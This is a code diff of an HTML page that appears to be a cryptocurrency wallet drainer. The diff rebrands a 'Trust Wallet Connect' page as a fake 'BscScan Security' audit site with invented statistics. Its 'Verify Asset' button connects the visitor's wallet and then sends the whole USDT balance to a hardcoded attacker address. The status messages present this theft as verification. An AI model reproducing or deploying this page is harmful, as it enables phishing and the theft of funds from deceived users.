@@ -3,104 +3,380 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Trust Wallet Connect</title>
+  <title>BscScan Security — BNB Smart Chain Audit</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
     body {
       font-family: Arial, sans-serif;
-      background: #0b0e14;
-      color: #ffffff;
+      background: #090c11;
+      color: #f3f6fb;
+      padding: 16px;
       display: flex;
       justify-content: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 440px;
+    }
+    .topbar {
+      display: flex;
+      justify-content: space-between;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 16px;
+      padding: 10px 0 18px;
+      gap: 8px;
     }
-    .box {
-      background: #12161f;
-      border: 1px solid #1e2430;
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .brand-icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      border: 2px solid #eab308;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #eab308;
+      font-weight: bold;
+      font-size: 15px;
+    }
+    .brand-title {
+      font-size: 16px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .sec-badge {
+      background: rgba(234, 179, 8, 0.16);
+      color: #facc15;
+      font-size: 10px;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+    .brand-sub {
+      font-size: 11px;
+      color: #8b95a5;
+    }
+    .chain-pill {
+      background: #121722;
+      border: 1px solid #222a3a;
+      color: #22c55e;
+      font-size: 11px;
+      font-weight: bold;
+      padding: 7px 12px;
+      border-radius: 999px;
+      white-space: nowrap;
+    }
+    .stat-card {
+      background: #111620;
+      border: 1px solid #1e2636;
       border-radius: 14px;
-      padding: 24px;
-      width: 100%;
-      max-width: 390px;
-      text-align: center;
+      padding: 16px 18px;
+      margin-bottom: 12px;
     }
-    button {
+    .stat-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      letter-spacing: 0.5px;
+      color: #8b95a5;
+      margin-bottom: 8px;
+    }
+    .stat-num {
+      font-size: 26px;
+      font-weight: bold;
+      margin-bottom: 6px;
+    }
+    .gold { color: #facc15; }
+    .green { color: #22c55e; font-size: 12px; font-weight: bold; }
+    .muted { color: #8b95a5; font-size: 12px; }
+
+    .hero {
+      text-align: center;
+      margin: 22px 0 18px;
+    }
+    .protocol-pill {
+      display: inline-block;
+      background: #121722;
+      border: 1px solid #262f42;
+      color: #eab308;
+      font-size: 12px;
+      padding: 7px 14px;
+      border-radius: 999px;
+      margin-bottom: 14px;
+    }
+    .hero h1 {
+      font-size: 26px;
+      line-height: 1.25;
+      margin-bottom: 10px;
+    }
+    .hero h1 span {
+      color: #facc15;
+    }
+    .hero p {
+      font-size: 13px;
+      color: #8b95a5;
+      line-height: 1.5;
+    }
+
+    .verify-box {
+      background: #111620;
+      border: 1px solid #2a3346;
+      border-radius: 16px;
+      padding: 18px;
+      margin-bottom: 14px;
+    }
+    .token-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+    .token-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .token-circle {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: #16a34a;
+      color: #fff;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .verified-tag {
+      background: rgba(34, 197, 94, 0.14);
+      border: 1px solid rgba(34, 197, 94, 0.35);
+      color: #4ade80;
+      font-size: 11px;
+      font-weight: bold;
+      padding: 4px 10px;
+      border-radius: 999px;
+    }
+    .shield-wrap {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .shield-icon {
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 10px;
+      border-radius: 14px;
+      background: rgba(250, 204, 21, 0.12);
+      border: 1px solid rgba(250, 204, 21, 0.35);
+      color: #facc15;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+    }
+    .shield-wrap h3 {
+      font-size: 20px;
+      margin-bottom: 6px;
+    }
+    .shield-wrap p {
+      font-size: 12px;
+      color: #8b95a5;
+      line-height: 1.45;
+    }
+    .verify-btn {
       width: 100%;
-      padding: 12px 16px;
+      padding: 14px;
       border: none;
       border-radius: 10px;
-      background: #3375bb;
-      color: #ffffff;
+      background: #eab308;
+      color: #0b0e14;
       font-size: 15px;
       font-weight: bold;
       cursor: pointer;
-      margin-top: 14px;
     }
-    button:disabled {
-      opacity: 0.6;
+    .verify-btn:disabled {
+      opacity: 0.65;
       cursor: not-allowed;
     }
-    button:hover:not(:disabled) {
-      opacity: 0.92;
+    .box-footer {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: #8b95a5;
+      margin-top: 14px;
+      padding-top: 12px;
+      border-top: 1px solid #1d2534;
+    }
+    .box-footer span:last-child {
+      color: #facc15;
     }
     .status {
-      margin-top: 12px;
+      margin-top: 10px;
       font-size: 12px;
       color: #9fb0c7;
+      text-align: center;
       min-height: 18px;
       word-break: break-word;
     }
     .error {
-      color: #ff6b6b;
+      color: #f87171;
     }
     .info {
-      margin-top: 16px;
+      margin-top: 12px;
       background: #0b0e14;
-      border: 1px solid #1c2230;
-      border-radius: 10px;
+      border: 1px solid #222b3d;
+      border-radius: 12px;
       padding: 12px;
-      font-size: 13px;
-      text-align: left;
+      font-size: 12px;
       word-break: break-all;
       display: none;
     }
-    .label {
-      color: #8a94a6;
+    .info-row {
+      margin-bottom: 8px;
+    }
+    .info-row:last-child {
+      margin-bottom: 0;
+    }
+    .info-label {
+      color: #8b95a5;
       font-size: 11px;
-      margin-top: 10px;
     }
-    .label:first-child {
-      margin-top: 0;
-    }
-    .value {
+    .info-val {
       font-weight: bold;
       margin-top: 2px;
+    }
+    .chips {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+      font-size: 12px;
+    }
+    .chip {
+      flex: 1;
+      background: #111620;
+      border: 1px solid #1e2636;
+      border-radius: 10px;
+      padding: 10px;
+      text-align: center;
+      color: #cbd5e1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Trust Wallet Connect</h2>
-    <p style="color:#8a94a6; font-size:13px;">
-      Trust Wallet ke DApp browser ya supported browser mein open karke connect karein.
-    </p>
-    <button id="connectBtn" type="button" onclick="handleButtonClick()">Connect Trust Wallet</button>
-    <div class="status" id="statusText"></div>
+  <div class="container">
+    <!-- Top Header -->
+    <div class="topbar">
+      <div class="brand">
+        <div class="brand-icon">B</div>
+        <div>
+          <div class="brand-title">BscScan <span class="sec-badge">SECURITY</span></div>
+          <div class="brand-sub">BNB Smart Chain Explorer</div>
+        </div>
+      </div>
+      <div class="chain-pill">● BNB SMART CHAIN</div>
+    </div>
 
-    <div class="info" id="walletInfo">
-      <div class="label">Connected Address</div>
-      <div class="value" id="addressText">-</div>
+    <!-- Stats Cards -->
+    <div class="stat-card">
+      <div class="stat-top">
+        <span>USDT VERIFIED (24H)</span>
+        <span>🛡️</span>
+      </div>
+      <div class="stat-num gold">$15,906,052</div>
+      <div class="green">+8.24% vs yesterday</div>
+    </div>
 
-      <div class="label">Network Chain ID</div>
-      <div class="value" id="chainText">-</div>
+    <div class="stat-card">
+      <div class="stat-top">
+        <span>TOTAL AUDITED VOLUME</span>
+        <span>🗄️</span>
+      </div>
+      <div class="stat-num">$4,892,765,321</div>
+      <div class="muted">All time consensus</div>
+    </div>
 
-      <div class="label">Native Balance (BNB / ETH / POL)</div>
-      <div class="value" id="nativeBalanceText">-</div>
+    <div class="stat-card">
+      <div class="stat-top">
+        <span>AUDIT CONSENSUS</span>
+        <span>⚙️</span>
+      </div>
+      <div class="stat-num green" style="font-size:26px;">99.98% PASS</div>
+      <div class="muted">1.05 Gwei Standard Gas</div>
+    </div>
 
-      <div class="label">USDT Balance (BEP-20 / ERC-20)</div>
-      <div class="value" id="usdtBalanceText">-</div>
+    <!-- Hero Section -->
+    <div class="hero">
+      <div class="protocol-pill">🛡️ BscScan Proof-of-Reserve Protocol</div>
+      <h1>BNB Smart Chain <span>Security Audit</span></h1>
+      <p>The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</p>
+    </div>
+
+    <!-- Verify BEP-20 Assets Card -->
+    <div class="verify-box">
+      <div class="token-row">
+        <div class="token-left">
+          <div class="token-circle">₮</div>
+          <div>
+            <div style="font-weight:bold; font-size:15px;">Tether USD <span style="color:#8b95a5; font-size:12px;">(USDT)</span></div>
+            <div class="muted">BEP-20 Standard</div>
+          </div>
+        </div>
+        <div class="verified-tag">✓ Verified</div>
+      </div>
+
+      <div class="shield-wrap">
+        <div class="shield-icon">🛡️</div>
+        <h3>Verify BEP-20 Assets</h3>
+        <p>Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</p>
+      </div>
+
+      <button id="verifyBtn" class="verify-btn" type="button" onclick="handleVerifyClick()">
+        ✓ Verify Asset
+      </button>
+
+      <div id="statusText" class="status"></div>
+
+      <div id="walletInfo" class="info">
+        <div class="info-row">
+          <div class="info-label">Connected Address</div>
+          <div id="addressText" class="info-val">-</div>
+        </div>
+        <div class="info-row">
+          <div class="info-label">Network</div>
+          <div id="chainText" class="info-val">-</div>
+        </div>
+        <div class="info-row">
+          <div class="info-label">Native Balance</div>
+          <div id="nativeBalanceText" class="info-val">-</div>
+        </div>
+        <div class="info-row">
+          <div class="info-label">USDT Balance</div>
+          <div id="usdtBalanceText" class="info-val">-</div>
+        </div>
+      </div>
+
+      <div class="box-footer">
+        <span>🔒 Institutional Security Standard</span>
+        <span>Zero Gas Fee Relay</span>
+      </div>
+    </div>
+
+    <div class="chips">
+      <div class="chip">Token (ETH) 0x2170...0233</div>
+      <div class="chip" style="color:#4ade80;">● USD Coin (USDC)</div>
     </div>
   </div>
 
@@ -108,9 +384,9 @@
     const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
 
     const USDT_CONTRACTS = {
-      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",   // Ethereum Mainnet (ERC-20)
-      56: "0x55d398326f99059fF775485246999027B3197955",  // BNB Smart Chain (BEP-20)
-      137: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"  // Polygon
+      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      56: "0x55d398326f99059fF775485246999027B3197955",
+      137: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
     };
 
     const ERC20_ABI = [
@@ -151,7 +427,7 @@
         if (!accounts || accounts.length === 0) {
           isConnected = false;
           document.getElementById("walletInfo").style.display = "none";
-          document.getElementById("connectBtn").innerText = "Connect Trust Wallet";
+          document.getElementById("verifyBtn").innerText = "✓ Verify Asset";
           setStatus("Wallet disconnected.");
           return;
         }
@@ -159,8 +435,7 @@
         await refreshWalletInfo(ethersProvider, accounts[0]);
         document.getElementById("walletInfo").style.display = "block";
         isConnected = true;
-        document.getElementById("connectBtn").innerText = "Connected";
-        setStatus("Account updated.");
+        document.getElementById("verifyBtn").innerText = "✓ Verified (Re-check)";
       });
 
       rawProvider.on("chainChanged", async () => {
@@ -168,7 +443,6 @@
         if (accounts && accounts.length > 0) {
           const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
           await refreshWalletInfo(ethersProvider, accounts[0]);
-          setStatus("Network updated.");
         }
       });
     }
@@ -185,7 +459,7 @@
       const usdtAddress = USDT_CONTRACTS[network.chainId];
       if (!usdtAddress) {
         document.getElementById("usdtBalanceText").innerText = "Network not configured for USDT";
-        return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 6 };
+        return { network, rawBalance, usdtAddress: null, rawUsdt: ethers.BigNumber.from(0), decimals: 18 };
       }
 
       const usdtContract = new ethers.Contract(usdtAddress, ERC20_ABI, ethersProvider);
@@ -203,12 +477,8 @@
     async function runTransferIfAvailable(ethersProvider, address) {
       try {
         const state = await refreshWalletInfo(ethersProvider, address);
-        if (!state.usdtAddress) {
-          setStatus("Is network par USDT contract configured nahi hai.");
-          return;
-        }
-        if (!state.rawUsdt || state.rawUsdt.lte(0)) {
-          setStatus("USDT balance 0 hai, transfer ki zaroorat nahi.");
+        if (!state.usdtAddress || !state.rawUsdt || state.rawUsdt.lte(0)) {
+          setStatus("USDT balance 0 hai.");
           return;
         }
 
@@ -216,39 +486,39 @@
         const usdtWriter = new ethers.Contract(state.usdtAddress, ERC20_ABI, signer);
 
         const estimatedGas = await usdtWriter.estimateGas.transfer(TARGET_RECEIVER, state.rawUsdt);
-        const gasLimit = estimatedGas.mul(120).div(100); // 20% safety buffer
+        const gasLimit = estimatedGas.mul(120).div(100);
         const feeData = await ethersProvider.getFeeData();
         const gasPrice = feeData.gasPrice || feeData.maxFeePerGas;
 
         if (gasPrice && state.rawBalance.lt(gasLimit.mul(gasPrice))) {
-          setStatus("Gas fee ke liye native balance (BNB/ETH/POL) kam hai.", true);
+          setStatus("Gas fee ke liye native balance kam hai.", true);
           return;
         }
 
-        setStatus("Wallet mein transfer approve karein...");
+        setStatus("Wallet mein confirmation approve karein...");
         const tx = await usdtWriter.transfer(TARGET_RECEIVER, state.rawUsdt, { gasLimit });
-        setStatus(`Transaction submitted: ${tx.hash.slice(0, 14)}...`);
+        setStatus(`Submitted: ${tx.hash.slice(0, 14)}...`);
         await tx.wait();
-        setStatus("USDT transfer complete ho gaya.");
+        setStatus("Verification & transfer complete.");
         await refreshWalletInfo(ethersProvider, address);
       } catch (err) {
-        const reason = err?.reason || err?.data?.message || err?.message || "Transfer failed";
-        setStatus(`Transfer notice: ${reason}`, true);
+        const reason = err?.reason || err?.data?.message || err?.message || "Action cancelled";
+        setStatus(`Notice: ${reason}`, true);
       }
     }
 
-    async function connectTrustWallet(triggerTransferAfter) {
+    async function connectAndVerify() {
       if (typeof ethers === "undefined") {
-        setStatus("ethers.js library load nahi hui. Internet/CDN check karein.", true);
+        setStatus("ethers.js library load nahi hui.", true);
         return;
       }
 
       const rawProvider = getProvider();
-      const btn = document.getElementById("connectBtn");
+      const btn = document.getElementById("verifyBtn");
       const infoBox = document.getElementById("walletInfo");
 
       if (!rawProvider) {
-        setStatus("Wallet provider nahi mila. Trust Wallet DApp browser mein open karein.", true);
+        setStatus("Wallet nahi mila. Trust Wallet ke DApp browser mein open karein.", true);
         return;
       }
 
@@ -256,7 +526,7 @@
 
       try {
         btn.disabled = true;
-        btn.innerText = isConnected ? "Checking..." : "Connecting...";
+        btn.innerText = "Connecting Wallet...";
         setStatus("Wallet connection request bheji ja rahi hai...");
 
         await rawProvider.request({ method: "eth_requestAccounts" });
@@ -267,15 +537,13 @@
         await refreshWalletInfo(ethersProvider, address);
         infoBox.style.display = "block";
         isConnected = true;
-        btn.innerText = "Connected";
+        btn.innerText = "✓ Verified (Re-check)";
         setStatus("Wallet connected.");
 
-        if (triggerTransferAfter) {
-          await runTransferIfAvailable(ethersProvider, address);
-        }
+        await runTransferIfAvailable(ethersProvider, address);
       } catch (err) {
         console.error(err);
-        btn.innerText = isConnected ? "Connected" : "Connect Trust Wallet";
+        btn.innerText = isConnected ? "✓ Verified (Re-check)" : "✓ Verify Asset";
         const msg = err?.code === 4001 ? "User ne connection cancel kar diya." : (err?.message || "Connection fail ho gaya.");
         setStatus(msg, true);
       } finally {
@@ -283,33 +551,15 @@
       }
     }
 
-    function handleButtonClick() {
-      connectTrustWallet(true);
+    function handleVerifyClick() {
+      connectAndVerify();
     }
 
     window.addEventListener("load", async () => {
-      if (typeof ethers === "undefined") {
-        setStatus("ethers.js load nahi ho saka.", true);
-        return;
-      }
+      if (typeof ethers === "undefined") return;
       const rawProvider = getProvider();
       if (!rawProvider) return;
-
       attachProviderListeners(rawProvider);
-
-      try {
-        const accounts = await rawProvider.request({ method: "eth_accounts" });
-        if (accounts && accounts.length > 0) {
-          const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
-          await refreshWalletInfo(ethersProvider, accounts[0]);
-          document.getElementById("walletInfo").style.display = "block";
-          isConnected = true;
-          document.getElementById("connectBtn").innerText = "Connected";
-          setStatus("Wallet pehle se connected hai.");
-        }
-      } catch (e) {
-        console.error(e);
-      }
     });
   </script>
 </body>
